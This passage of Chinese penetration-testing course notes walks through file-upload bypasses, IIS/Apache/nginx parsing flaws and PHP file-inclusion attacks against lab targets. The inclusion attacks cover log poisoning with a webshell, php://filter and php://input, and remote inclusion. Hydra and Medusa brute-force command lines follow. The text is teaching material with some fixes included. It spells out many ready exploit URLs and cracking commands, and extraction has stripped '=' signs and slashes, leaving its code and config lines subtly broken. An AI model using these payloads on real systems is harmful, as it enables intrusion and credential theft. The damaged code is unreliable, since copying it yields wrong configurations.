上传名字为18.php.7Z的文件(因为该题的源代码中支持这个类型文件的上传，有白名单)，快速重复提交该数据包，会提示文件已经被上传，但没有被重命名。apache解析文件名称的时候，是从右往左解析的，当它看到不认识的扩展名时，他就找前面的扩展名作为文件扩展名，这样它就当成了18.php了。直接上传，我们通过抓包工具看一下 你注意观察upload文件夹，注意这是网站根目录的那个upload文件夹，不是根目录中的那个upload文件夹昂，发现这个文件上传上去之后，被重命名了。所以，我们现在其实玩的也是时间竞争。我们如果将包发到burp的测试器中，发送3000个包，100个线程发送，那么有些文件是没有来得及被重命名的，但是我们直接访问这个文件的时候你发现其实文件还是不能被解析的 因为我们使用的phpstudy中的apache是没有这个漏洞的了，所以看不出效果。但是通过其他方式搭建的apache，它是有一个漏洞的，因为apache能解析upload1.php.7z的，自动解析成了php文件。 快速提交上面的数据包，可以让文件名字不被重命名上传成功。 然后利用Apache的解析漏洞，即可获得shell 3-19 第十九关原理同Pass-11**，上传的文件名用0x00绕过。改成19.php【二进制00】.1.jpg，这里就不在演示了。 3-20 第二十关Pass-20来源于CTF，请审计代码！这是代码审计出来的漏洞，直接渗透测试其实很难发现的，这个漏洞 我们就不讲了，以后我们在讲代码审计的工作。 $is_upload false; $msg null; if(!empty($_FILES[‘upload_file’])){ 检查MIME $allow_type array(‘imagejpeg’,’imagepng’,’imagegif’); if(!in_array($_FILES[‘upload_file’][‘type’],$allow_type)){ $msg “禁止上传该类型文件!”; }else{ 检查文件名 $file empty($_POST[‘save_name’]) ? $_FILES[‘upload_file’][‘name’] : $_POST[‘save_name’]; if (!is_array($file)) { $file explode(‘.’, strtolower($file)); } $ext end($file); $allow_suffix array(‘jpg’,’png’,’gif’); if (!in_array($ext, $allow_suffix)) { $msg “禁止上传该后缀文件!”; }else{ $file_name reset($file) . ‘.’ . $file[count($file) - 1]; $temp_file $_FILES[‘upload_file’][‘tmp_name’]; $img_path UPLOAD_PATH . ‘‘ .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $msg “文件上传成功！”; $is_upload true; } else { $msg “文件上传失败！”; } } } }else{ $msg “请选择要上传的文件！”; } 解题思路:这个思路大家自己看看就行了，我们直接看演示效果，也就是解题步骤。 文件命名规则：$file_name reset($file) . ‘.’ . $file[count($file) - 1]; reset():将内部指针指向数组中的第一个元素，并输出。 end():将内部指针指向数组中的最后一个元素，并输出。 $file empty($_POST[‘save_name’]) ? $_FILES[‘upload_file’][‘name’] : $_POST[‘save_name’]; 如果save_name不为空则file为save_name,否则file为filename if (!is_array($file))判断如果file不是数组则以’.’分组 文件名命名规则$file_name reset($file) . ‘.’ . $file[count($file) - 1]; 我们POST传入一个save_name列表：[‘info20.php’, ‘’, ‘jpg’],此时 empty($_POST[‘save_name’]) 为假则file为save_name，所以由$ext end($file);为jpg可以通 过后缀名判断（判断结束后最后一个元素jpg弹出），并且最终文件名组装为upload20.php. 解题步骤 上传包数据为，那个1.jpg其实是1.php改的名字，为了上传的时候通过前端js校验而已，里面有木马，重点要通过后端校验，我们抓包看效果 还要注意，上传的时候，提示你文件保存名了 修改包数据 查看upload文件夹 文件就上传上来了，搞定。其实主要是分析源代码找到的漏洞。 文件包含漏洞和web服务器程序解析漏洞来实现的。黑名单的防御，基本都可以绕过。以后看到文件上传的功能，大家就可以按照几种手段来进行尝试测试。白名单的绕过方式，其实基本上都需要php的版本比较低，低于5.4的、并且魔术符号功能没有打开，两个条件才行，高版本的php基本没有这种白名单漏洞了。我们基本是按照ctf考题来学习的，所有文件上传漏洞方式基本都涵盖了。 下面我们去学习一下web服务程序的解析漏洞，看下一章。 9-4 Web服务程序解析漏洞9-4-1 0x00 总览说明服务器解析漏洞算是历史比较悠久了，但如今依然广泛存在。在此记录汇总一些常见服务器（WEB server）的解析漏洞，比如IIS6.0、IIS7.5、apache、nginx等方便以后回顾温习。 9-4-2 IIS5.x-6.x解析漏洞## 使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。win7-win10中多为iis7.x-8.x了，版本比较高。 目录解析(6.0) 形式：www.xxx.com/xx.asp/xx.jpg 原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。 文件解析 形式：www.xxx.com/xx.asp;.jpg 原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。 解析文件类型 IIS6.0 默认的可执行文件除了asp还包含这三种 : test.asa test.cer test.cdx 修复方案 1.目前尚无微软官方的补丁，可以通过自己编写正则，阻止上传xx.asp;.jpg类型的文件名。 2.做好权限设置，限制用户创建文件夹。 示例： win2003中的iis默认是存在一些文件上传漏洞的，我们演示一下： 1.目录解析：新建一个xx.asp文件夹， 服务器默认会把.asp，.asa目录下的任意后缀名的文件都解析成asp文件。这个我们昨天演示过了的。这个有个前提条件，就是用户对目录有修改权限。如果我们通过抓包工具抓包，发现其中的目录是可以通过请求来改变的，那么这种情况下，很有可能成功。 2.文件解析：形式：www.xxx.com/xx.asp;.jpg，也就是说，如果我们将某个asp文件改为xx.asp;.jpg，那么iis能够对这个文件类型进行解析。 比如我们将网站的index.asp文件改为index.asp;.jpg 访问一下看效果： 3.解析文件类型 ## IIS6.0 默认的可执行文件除了asp还包含这三种 :也都是当作脚本来解析，一般开发人员做黑名单的时候，不会将如下三个后缀名文件加入到黑名单，导致漏洞 test.asa test.cer test.cdx 看示例： 比如还是将index.asp改为index.cer文件 访问效果： cer文件一般是证书文件，iis默认也是可以解析的，我们来看网站属性 高版本的iis，比如iis7.5的解析漏洞，我们一会再看，先看看apache的。 9-4-3 apache解析漏洞漏洞原理 ## Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把xx.php.owf.rar解析成php。 ## 漏洞形式 www.xxxx.xxx.com/test.php.php123这个漏洞当时通杀了所有的apache搭建的网站。 ## 其余配置问题导致漏洞 ## （1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。 ## （2）如果在 Apache 的 conf 里有这样一行配置 AddType applicationx-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。xx.jpg 1. 示例：www.xxxx.xxx.com/test.php.php123 比如我们将sql.php改为sql.php.xxxx，正常来讲的话是不能解析的，但是老版本的apache(apache2.2版本及之前的)是能够正常将这个文件解析为php文件的 我用的是新版本的apache，没搭建老版本的，所以这个漏洞大家就记住他就行了，当然，新版本的apache如果配置不当也会引起这个漏洞，有兴趣的大家可以去安装一个低版本的apache来玩玩，你看新版本的就不解析运行代码了，直接把源代码给你看，而不是将源代码执行了。以前大家通过黑名单的方式来防御的，基本都挂了，因为你发现后缀名你随意写。 2.其余配置问题导致漏洞 ## （1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。 ## （2）如果在 Apache 的 conf 里有这样一行配置 AddType applicationx-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。 这两个漏洞不是apache自身的问题，而是运维人员进行配置时，自己配置的出了问题。 这里就不演示了，接下来看nginx的解析漏洞。 修复方案 1.apache配置文件，禁止.php.这样的文件执行，配置文件里面加入 Order Allow,Deny Deny from all 2.用伪静态能解决这个问题，重写类似.php.这类文件，打开apache的httpd.conf找到LoadModule rewrite_module modulesmod_rewrite.so把#号去掉，重启apache,在网站根目录下建立.htaccess文件,代码如下: RewriteEngine On RewriteRule .(php.|php3.) index.php RewriteRule .(pHp.|pHp3.) index.php RewriteRule .(phP.|phP3.) index.php RewriteRule .(Php.|Php3.) index.php RewriteRule .(PHp.|PHp3.) index.php RewriteRule .(PhP.|PhP3.) index.php RewriteRule .(pHP.|pHP3.) index.php RewriteRule .(PHP.|PHP3.) index.php 9-4-4 nginx解析漏洞大致原理：该漏洞与nginx、php版本无关，属于配置不当造成的解析漏洞。 ## 当php.ini配置文件中开启了cgi.fix_pathinfo，该值默认为1，表示开启。看名字大概知道是处理路径用的配置。 ## 比如我们上传了一个木马文件web.jpg，因为web.php不能上传，现在我们想执行这个web.jpg，可以如下路径访问 http://192.168.2.104/pikachu/web.jpg/aaa.php ## 而目标服务器上没有aaa.php文件，本来如果nginx.conf的配置没有问题的话，nginx会先去找下这个文件是否存在，如果存在，在找php解释器来解释执行代码，如果不存在，nginx会直接返回错误信息，说找不到该文件，但是如果nginx.conf配置不当会导致nginx把以’.php’结尾的文件交给fastcgi处理，也就是说首先nginx看到你路径中要找aaa.php，哦，原来是php文件，nginx不去找这个文件了，而是就直接交给了fastcgi，fastcgi又去找php解释器去处理该路径，而php开启了cgi.fix_pathinfo，那么php解释器处理这个路径的时候，发现没有aaa.php文件，那么他会找路径中上一层路径的文件作为aaa.php来运行，如是乎就找到了web.jpg，将web.jpg当作aaa.php来运行了，所以代码被执行，看到如下效果 示例：我们通过phpstudy来改成nginx运行 fix_pathinfo这个功能参数默认是开启的，所以这个漏洞影响也是比较大的，我们访问一下phpinfo.php文件，看看这个功能是否开启了。 比如我将一个木马文件，改为.jpg文件，放到pikachu的文件夹下 然后通过浏览器来访问一下 能看出，默认是不能访问的，我们只要在路径后面加上一个 tu.php ，就能够按照php来解析了，直接就是漏洞。因为图片我们是正常能够上传的，上传过去之后，如果是nginx来解析的，并且开启了cgi.fix_pathinfo功能，那么基本上属于被你拿下了。 其他漏洞形式 www.xxxx.com/UploadFiles/image/1.jpg/1.php，这是上面说的漏洞 www.xxxx.com/UploadFiles/image/1.jpg%00.php #我们试过这个00截断，除了apache之外，nginx也有这个00截断漏洞,这个导致的效果是：1.jpg会被当成php文件来解析。 www.xxxx.com/UploadFiles/image/1.jpg/%20\\0.php #也算是00截断的一种 xxx.jpg%00.php (Nginx 0.8.03版本 存在空字节代码执行漏洞) **修复方案** 1.修改php.ini文件，将cgi.fix_pathinfo的值设置为0; 2.在Nginx配置文件中添加以下代码： if ( $fastcgi_script_name ~ ..*.*php ) { return 403; } 这行代码的意思是当匹配到类似test.jpga.php的URL时，将返回403错误代码。 9-4-5 IIS7.x解析漏洞IIS7.5的漏洞与nginx的类似，都是由于php配置文件(php.ini文件)中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞，都是配置不当引起的。 https://www.xp.cn/a.php/182.html 当安装完成后， php.ini里默认cgi.fix_pathinfo1，对其进行访问的时候，在URL路径后添加.php后缀名会当做php文件进行解析，漏洞由此产生 php.ini文件配置 虽然通过配置上看，我们发现是有这个漏洞的，但是实际测试过程中，并不是那么简单，如下，注意，下面的示例是用的phpstudy2016版本来演示的，win7及以上的系统才行昂，win2003不行的，勾选iis的时候，可能会提示你，说你没有尚未安装iis 78，大家自行安装一下即可。按照这个phpstudy的官网来安装：https://www.xp.cn/a.php/182.html，其中要激活CGI功能，别忘了。 你的phpstudy可能会报错 解决方法：安装vc9工具 放到我们的win7虚拟机上 安装 一会就提示你安装好了，在重启phpstudy即可。如果提示你网站运行端口冲突了，我们改个端口即可 按照文档的安装和配置，我们访问我们的iis网站下面的图片时 根据iis的解析漏洞方式来写如下访问网址： 还是报错了，要进行如下配置才能看到效果。 找到网站代码存放目录，来部署网站： 注：在进行实际的测试的时候，iis并不像nginx似的直接可以利用，发现漏洞并没有产生，后来发现要将FastCGI的调用情况取消限制，如下，将对勾去掉。 效果如下 所以你会发现，这个漏洞如果想用的话，高版本需要进行很多的配置，所以一般不会出现这个漏洞。 9-4-6 文件包含漏洞6-1 PHP包含漏洞分类包含漏洞不是语言的问题，而是人的思维问题! PHP中的四个包含文件函数include(),include_once(),require()和require_once()。Include用的比较多。 require一个文件存在错误的话，那么程序就会中断执行了，并显示致命错误 include一个文件存在错误的话，那么程序不会中端，而是继续执行，并显示一个警告错误。 include_once()，require_once()会先检查目标文件的内容是不是在之前就已经导入过了，如果是的话，便不会再次重复导入同样的内容。 下面我们一起来看PHP文件中的包含。 1、本地包含 LIF，这个比较好利用 2、远程包含 RLF，需要开启这两个功能：allow_url_includeon并且magic_quotes_gpcoff 6-2 PHP本地包含示例示例：http://192,168.18.16/123.php?filename=1.php] 比如我们在phpstudy的www目录下创建如下文件，内容如下 然后我们比如有一个木马文件在这里面 然后浏览器中我们访问这个123.php文件 然后发现，木马文件被利用了，我们做代码审计的时候，如果发现有使用到我们上面说到的四个文件包含函数，那么我们就可以检测一下它的漏洞，如果和我们写的代码似的，直接引入某个用户输入的文件，那么这就是本地包含漏洞。相对路径也可以 6-3 PHP远程包含实例allow_url_includeoff这行,把off改成on，魔术符号关闭，这两个条件设置一下 http://192.168.18.16/webshell.jpg 效果： 6-4 包含漏洞上传技巧一般采用一句话木马与图片绑定，这个讲过了。 6-5 包含日志文件当某个PHP文件存在本地包含漏洞，而却无法上传正常文件，这就意味着有包含漏洞却不能拿来利用，这时攻击者就有可能会利用apache日志文件来入侵。 Apache服务器运行后会生成两个日志文件，这两个文件是access.log(访问日志)和error.log(错误日志)，apache的日志文件记录下我们的操作，并且写到访问日志文件access.log之中 C:\\phpStudy\\PHPTutorial\\Apache\\logs\\access.log # varlognginxaccess.log C:\\phpStudy\\PHPTutorial\\WWW\\DVWA\\vulnerabilities\\fi\\index.php ........Apachelogsaccess.log 例如:http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=../../../../Apache-20\\logs\\access.log 示例： 首先开启日志记录功能 找到httpd-conf，然后打开，在配置中修改日志开启状态 然后重启phpstudy即可 看到了access.log文件，这个日志记录文件在工作中都是要开启的，首先现在国家安全法里面规定要进行日志记录，再有就是企业可以通过日志记录快速的排查问题出现在哪里，方便工作，虽然默认配置中没有开启日志记录，但是我们一定要开。 比如我们刷新一下刚才的请求 然后打开access.log文件，看日志 任何访问都被记录下来了。那么针对日志记录格式，其实在配置文件中也可以修改的 好，日志记录开启之后，我们继续来看我们的日志文件包含漏洞 我们可以先用 来测试一下。 看到日志如下，被url编码了 我们通过包含日志的方式在浏览器上访问一下 发现代码并没有执行，这是因为url编码之后保存在日志中的代码是不能被执行的，所以我们发送过去的代码不要进行url编码，但是url编码是浏览器的自动行为，所以我们通过抓包来进行修改 再放包过去，看日志，就没有被url编码 此时浏览器再访问，效果如下，代码被执行了。 接下来我们可以找一个一句话木马 ## 通过后台目录分析，发现目录层级关系如下： C:\\phpStudy\\PHPTutorial\\Apache\\logs\\access.log C:\\phpStudy\\PHPTutorial\\WWW\\DVWA\\vulnerabilities\\fi\\index.html ## 所以可以通过..来找到日志： http://192.168.31.172/dvwa/vulnerabilities/fi/?page=../../../../Apache/logs/access.log 然后通过浏览器访问一下 然后看日志 攻击代码被记录了，然后我们通过相对路径来找到access.log文件 然后有的时候，我们通过菜刀就能执行它了，但是有时候可能不行昂，有些编码数据可能菜刀不能识别出来，我们试一下 然后添加，双击进行连接，直接拿下了系统 如果发现还是连接不上，那么我们可以换一种方式，通过日志文件专门去生成一个一句话木马文件 ‘);? 抓包然后加上上面的代码，如下 放包过去，就看到日志文件中的记录如下 浏览器通过包含日志的方式访问一下 就看到在fi目录下生成了jaden.php文件，如下 然后通过蚁剑进行连接即可 这就是包含日志文件的漏洞利用，当然了如果有文件上传功能的话，我们通过上传文件携带木马的手段也能玩，日志这种是没有上传文件漏洞的网站的漏洞利用方式。所以学渗透重点是学习思路。除了上面两种利用方式之外，还有下面几个方式，我们一一来学。 6-6 PHP包含读文件所谓读文件，就是想办法读取某个目录中的某个文件内容 http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=x.php 访问URL,得到经过base64加密后的字符串: 经解密还原得到如下： 示例：这里我们用dvwa来玩一玩 找到文件包含测试 点击上面的file1.php，来到如下页面 所以我们其实可以按照开发人员的思路来想，这个人开发的时候，这个功能是在干什么，我们看一下源码 这个代码能看出，他没有对page参数做任何的过滤处理。 接下来我们抓包来玩一下，将page参数的值改为如下内容： 然后我们去dvwa的目录下创建一个x.php文件，如果想读取当前目录的上一层目录还可以自己加 .. ，比如： http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=../x.php我们看看目前的效果：之所以要走base64编码，是因为，如果不将读取出来的数据进行编码的话，那么 如果你读取的文件是php代码，那么它会自动执行，所以看不到文件代码数据，如果你是其他数据，不是php代码，那么很有可能报错，所以我们将读取出来的数据编码一下进行显示 然后通过burp的编码器来解码一下，看效果： 正是我们写的x.php文件里面的内容。 文件包含漏洞其实非常强大，能做很多的事情，只要你过滤没做好，那么就存在这种漏洞，现在很多站点还有这种漏洞。 6-7 PHP包含命令执行写入文件内容，做命令执行动作，这种漏洞属于高危漏洞。 构造URL: http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://input,并且提交请求体数据为: ## 这句话是利用php代码来执行操作系统指令，其实你执行什么代码都可以,比如 注意:只有在allow _url_include为on的时候才可以使用。 示例： 比如还是上一个请求包，我们改动一下 如果实验做不出来效果，那么就重启一下phpstudy和burp。 6-8 包含截断绕过 对于老手程序员，开发出来的代码可能会做一些安全限制，比如下面这种代码 http://192.168.18.16/123.php?page=x.php 这种方法只适合于magic_quotes_gpcoff的时候， php版本小于5.3.4，可通过%00截断绕过，不过现在已经很难见到了。 示例：比如还是我们的123.php文件，改动为上面的代码 并且注意这里面有个webshell.jpg文件，比如这个文件是我们上传上去的，我现在想执行以下它，于是我们在浏览器上访问了一下 发现报错了，并且自动在你指定的参数值后面加上了.php后缀，导致我们无法访问到webshell.jpg文件，那么怎么搞呢？通过%00截断，直接将你代码后面添加的.php给干掉了。注意了，这个和web服务程序的%00截断不太一样，那个是web服务程序自身的解析漏洞，这个是程序员代码漏洞昂。 6-9 str_replace函数绕过这是一个替换数据的函数，而且只替换一次，所以有漏洞。 ## 使用str_replace函数是极其不安全的，因为可以使用双写绕过替换规则。 ## 例如pagehthttp://tp://192.168.0.103/phpinfo.txt时，str_replace函数会将http://删除，于是page=http://192.168.0.103/phpinfo.txt，成功执行远程命令。 ## 同时，因为替换的只是“..”、“..\\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。 1、本地文件包含，写多个..那么str_replace其实只替换一次，那么我们的相对路径还能生效 http://192.168.0.103/dvwa/vulnerabilities/fi/page=..././..././..././..././..././xampp/htdocs/dvwa/php.ini 2、绝对路径不受任何影响 http://192.168.0.103/dvwa/vulnerabilities/fi/page=C:/xampp/htdocs/dvwa/php.ini 3、远程文件包含 http://192.168.0.103/dvwa/vulnerabilities/fi/page=htthttp://p://192.168.5.12/phpinfo.txt 示例： 用我们的dvwa，然后将安全等级调为中危 那么各种漏洞的代码会自动发生变化，比如： 这个代码的作用：1.不能远程包含了 2.将..等相对路径干掉了，这种情况如何突破呢？其实很简单。比如我们就找这个文件 然后通过浏览器访问： 相对路径方式： 方式1： 方式2：我们访问不在当前目录的文件：我们把x.php放到这个目录中来 http://192.168.18.16/dvwa/vulnerabilities/fi/?page=..././x.php 如下,也是可以的,如果你读取的是他源代码中的某些文件或者某些配置文件,我们需要编码一下,不然如果是php文件,那么文件中的代码会执行,可能会看到代码执行过程中报错的问题.就利用上面我们讲过的php:协议来搞. 接下来将dvwa做一个高安全等级 再来看文件包含: 报错了,这肯定是php版本的问题,切换一下版本: 然后再看效果: 通过查看源代码,我们发现了一个函数,叫做fnmatch,那么这个函数是做什么的呢?我们看下面 6-10 fnmatch函数绕过fnmatch函数是做正则匹配的. if(!fnmatch(“file“,$file)$file!”include.php”) ## 当文件既不是”include.php”也不是”file*”（文件名file开头）时才抛出错误，反之意思，如果文件名符合其中一个条件既可以。 pagefile:C:xampphtdocsdvwaphp.ini 刚好满足”file*”（文件名file开头）。注意，file协议用的是三个反斜杠昂 构造url http://192.168.0.103/dvwa/vulnerabilities/fi/page=file:///C:/xampp/htdocs/dvwa/php.ini ## 成功读取了服务器的配置文件 示例: 比如我们读取c盘下面的boot.ini文件： 6-11 PHP内置协议PHP带有很多内置URL风格的封装协议，可用于类似fopen()、copy()、file_exists()和filesize()的文件系统函数。 关于php:协议详解，参看文档:https://www.php.net/manual/zh/wrappers.php.php 那么，如果做才能保证安全呢？看dvwa，我们将安全级别调制impossible，没有漏洞的意思 看代码：直接使用的是不等于某个绝对名称 十，工具使用 10-1 暴力破解10-1-1 hydrahttp://www.thc.org/thc-hydra ——————————- 官网 https://cloud.tencent.com/developer/article/1643633?from=15425 ————————– 使用教程 hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] server service [OPT] -R ## 继续从上一次进度接着破解。 -S ## 采用SSL链接。 -s ## PORT 可通过这个参数指定非默认端口。 -l ## LOGIN 指定破解的用户，对特定用户破解。 -L ## FILE 指定用户名字典。 -p ## PASS 小写，指定密码破解，少用，一般是采用密码字典。 -P ## FILE 大写，指定密码字典。 -e ns ## 可选选项，n：空密码试探，s：使用指定用户和密码试探。 -C FILE ## 使用冒号分割格式，例如“登录名:密码”来代替-L-P参数。 -M FILE ## 指定目标列表文件一行一条。 -o FILE ## 指定结果输出文件。 -f ## 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。 -t TASKS ## 同时运行的线程数，默认为16。 -w TIME ## 设置最大超时的时间，单位秒，默认是30s。 -v -V ## 显示详细过程。 server ## 目标ip service 指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等。 OPT ## 可选项 指令：hydra -L user.txt -P top100.txt -vV -e ns 192.168.0.20 ssh 指令：hydra -L user.txt -P top100.txt -vV -e ns 192.168.0.20 ssh 破解成功，直接显示结果。也可以使用 -o 选项指定结果输出文件。这个我们可以试试看 hydra -L user.txt -P top100.txt -vV -e ns -o save.log 192.168.1.104 ssh 其它实例： 1.破解ssh： # hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh # hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh 2.破解ftp： # hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV # hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV 下面的是破解web的，web的暴力破解一般我们使用burp比较方便一些，所以下面的大家简单看看先 3.get方式提交，破解web登录： # hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get admin # hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get adminindex.php 4.post方式提交，破解web登录： # hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form “adminlogin.php:username^USER^password^PASS^submitlogin:sorry password” # hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form “login.php:id^USER^passwd^PASS^:wrong username or password” （参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密 码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破 解,中的内容是表示错误猜解的返回信息提示。） 5.破解https： # hydra -m index.php -l muts -P pass.txt 10.36.16.18 https 6.破解teamspeak： # hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak 7.破解cisco： # hydra -P pass.txt 10.36.16.18 cisco # hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable 8.破解smb： # hydra -l administrator -P top100.txt 192.168.0.102 smb 9.破解pop3：或者smtp等协议，这都是邮箱协议，在我们的qq邮箱中可以看到，可以自行开启的，可以找一找qq邮箱的pop服务器ip或者域名、端口等，在我们自己的邮箱设置中就能看到。带大家看看吧。 # hydra -l muts -P pass.txt my.pop3.mail pop3 10.破解rdp： 就是3389，我们可以开启一下windows2003的3389，然后测试一下，这个结果可能存在误报的。目前市面上所有暴力破解3389的工具基本都有这个问题。 # hydra 192.168.13.25 rdp -l administrator -P top100.txt -V 11.破解http-proxy： # hydra -l admin -P pass.txt http-proxy:10.36.16.18 12.破解imap： # hydra -L user.txt -p secret 10.36.16.18 imap PLAIN # hydra -C defaults.txt -6 imap:[fe80::2c:31ff:fe12:ac11]:143PLAIN 此工具强大之处远多于以上测试，其密码能否破解关键在于强大的字典，对于社工型渗透来说，有时能够得到事半功倍的效果 10-1-2 美杜莎medusahttps://blog.csdn.net/shenshuiwubo123/article/details/90739760 ## medusa（美杜莎）是一个速度快，支持大规模并行，模块化，爆破登陆，可以同时对多个主机，用户或是密码执行强力测试，medusa和hydra一样，同样属于在线破解工具，不同的是，medusa的稳定性相较于hydra要好很多但是支持的模块相对于hydra少一些。 medusha [-h host|-H file] [-u username | -U file] [-p password | -P file] [-C file] -M modudle [OPT] -h ## 目标主机名称或是IP地址 -H ## 包含目标主机名称或是IP地址文件 -u ## 测试用户名 -U ## 包含测试用户名文件 -p ## 测试用户名密码 -P ## 包含测试用户名密码文件 -C ## 组合条件文件 -O ## 日志信息文件 -e[nsns] ## n代表空密码，s代表为密码于用户名相同 -M ## 模块执行mingc -m ## 传递参数到模块 -d ## 显示所有模块名称 -n ## 使用非默认TCP端口 -s ## 启用ssl -r ## 重试时间，默认3秒 -t ## 设定线程数量 1、指定用户名于密码于服务进行破解 medusa -M ssh -u root -p owaspbwa -h 192.168.72.142 10-1-3 pkav暴力破解但是这个工具有个功能没有开发出来，目标网址抓包功能它是没有的，比如后台网址 http://192.168.0.25:81/admin/index.asp 将数据包黏贴到pkav中，然后添加标记 配置密码字典 验证码识别设置，我们先对获取验证码的请求进行抓包，拿到验证码网址 网址 http://192.168.0.25:81/admin/safecode.asp? ，并且可以看到我们验证码是个纯数字的图片验证码。 将网址设置到pkav中 点击识别测试看效果，但是我们多点击几次识别测试，你会看到有些识别也是错误的，没办法，图像识别目前基本做不到完全准确 我们现在识别的验证码图片比较简单，只有一些点点，有些图片加工的很复杂，点、先、圈等都有，肉眼看起来都费劲，还有像12306那种验证码，目前的OCR技术基本时是搞不定的。 重放选项设定： 暴力破解成功，这种是验证码漏洞，可以被ocr识别的，都是漏洞，我们就可以提交漏洞，但是验证码其实基本没有真正的安全，就连12306这种超复杂的验证码都有可能被搞定，有些打码平台就能做到，但是不在我们安全人员的考虑范围之内昂 10-1-4 防暴力破解## 1) 强制要求输入验证码，否则，必须实施IP策略,5次登录不成功直接封ip。 ## 2) 验证码只能用一次，用完立即过期！不能再次使用 ## 3) 验证码不要太弱。扭曲、变形、干扰线条、干扰背景色、变换字体等。 10-1-5 登录页面存在那些漏洞## 1.注入点 尝试一下万能密码登录，也就是我们前面sql注入讲的，不知道用户名密码的情况下登录 盲注、报错注入。。。 注册：xss攻击 ## 2.不安全的用户提示，一般提示用户名不存在或密码及验证码错误 比如csdn，看提示，提示的是用户名或者密码错误，没告诉你到底是哪个信息错误了，所以暴力破解起来也很难，如果明确提示你用户名错误，那就好搞一些，把没有提示用户名错误的数据保存下来，再去破解密码。 ## 3.查看登录页面源代码，是否存在敏感信息泄露 看看是否一些敏感信息、注释信息提示等等，还可以看看前端验证是否能够绕过 ## 4.不安全的验证码 ## 5.在注册帐号的时候是否存在不安全的提示 比如这个网站 https://bbs.pku.edu.cn/v2/login.php ，提示你邮箱地址不对，那么我们就可以暴力破解出一些有效的邮箱出来，这个叫做注册时的不安全提示。 ## 6，不安全的密码，在注册帐号的时候，密码没有限制复杂度 ## 7.在暴力破解的时候未限止ip，锁定用户 ## 8.一个帐号可以在多地登录，没有安全提示 ## 9.帐号登录之后，应该具备超时功能 ## 10.任意无限注册帐号 一个人一下子注册了1万个账号，你的数据库都支撑不住，这也算漏洞。 ## 11.OA、邮件、默认帐号等相关系统，在不是自己注册的情况下，应该在登录之后要强行更改密码 ## 12.逻辑漏洞，任意密码重置 ## 13.越权漏洞 越权的意思是：本来某个网站的网址页面，比如 adminindex.html 是需要登录之后才能访问的，但是他发现不登陆，直接访问这个路径也能进去，这种也是有可能的，这就是没有做好权限设置。其实这个越权叫做未授权访问。 ## 14.数据包含有敏感信息泄露，如cookice 登录一下，然后抓包查看cookie里面是否含有敏感信息，比如密码明文、验证码等都有可能出现在cookie中。 ## 15.不安全的数据传输，密码为明文，未使用https证书 ## 16，任意文 件下载 有的登录页面可能提供一些帮助文档下载，点击下载的时候，你可以获取到这个下载连接地址，根据这个连接地址中的参数来测试一下是否有任意文件下载漏洞 10-2 xray10-2-1 xrayCOMMANDS: webscan, ws Run a webscan task #扫描web漏洞 servicescan, ss Run a service scan task #扫描主机服务 subdomain, sd Run a subdomain task #扫描子域名 poclint, pl lint yaml poc #poc分析 transform transform other script to gamma #转换其他的gamma脚本 reverse Run a standalone reverse server #运行反连平台服务 convert convert results from json to html or from html to json #输出结果格式转换 genca GenerateToFile CA certificate and key #生成ca证书和key upgrade check new version and upgrade self if any updates found #检查新版本和升级 version Show version info #查看xray版本 help, h Shows a list of commands or help for one command #查看帮助 GLOBAL OPTIONS: –config FILE Load configuration from FILE (default: “config.yaml”) #指定配置文件启动 –log-level value Log level, choices are debug, info, warn, error, fatal #日志的等级 –help, -h show help #查看帮助 10-2-2 xray扫描单个urlOPTIONS: –list, -l list plugins #查看插件列表 –plugins value, –plugin value, –plug value specify the plugins to run, separated by ‘,’ #指定插件，多个插件分号隔开 –poc value, -p value specify the poc to run, separated by ‘,’ #指定poc，多个poc分号隔开 –listen value use proxy resource collector, value is proxy addr, (example: 127.0.0.1:1111) #使用被动代理扫描模式 –basic-crawler value, –basic value use a basic spider to crawl the target and scan the requests #使用主动爬虫扫描模式 –browser-crawler value, –browser value use a browser spider to crawl the target and scan the requests 